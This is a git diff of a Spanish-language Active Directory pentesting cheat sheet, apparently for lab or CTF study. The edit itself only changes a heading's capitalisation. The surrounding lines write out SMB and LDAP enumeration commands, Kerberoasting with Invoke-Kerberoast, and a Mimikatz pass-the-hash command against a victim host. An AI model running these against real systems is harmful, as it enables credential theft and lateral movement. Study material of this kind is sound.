@@ -188,7 +188,7 @@ Ahora el proceso es muy similar para obtener las columnas y los datos de las col
 
 `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //` #  # Utilizamos smbclient para intentar conectarnos a servicios compartidos de smb
 
-**Enumeramos ldap**
+**Enumeramos LDAP**
 
 `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP> ` # Enumeramos ldap con script de nmap
 
@@ -240,3 +240,5 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 *Una vez que tenga el hash de la víctima , puede usarlo para hacerse pasar por ella. Debe usar una herramienta que realice la autenticación NTLM usando ese hash , o puede crear un nuevo inicio de sesión e inyectar ese hash dentro del LSASS , de modo que cuando se realice cualquier autenticación NTLM , se usará ese hash.*
 
 `Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.htb /ntlm:NTLMhash /run:powershell.exe"' ` # Usamos mimikatz en la maquina victima, este ataque tambien se puede efectuar con usuarios del ordenador, no solo del dominio.
+
+
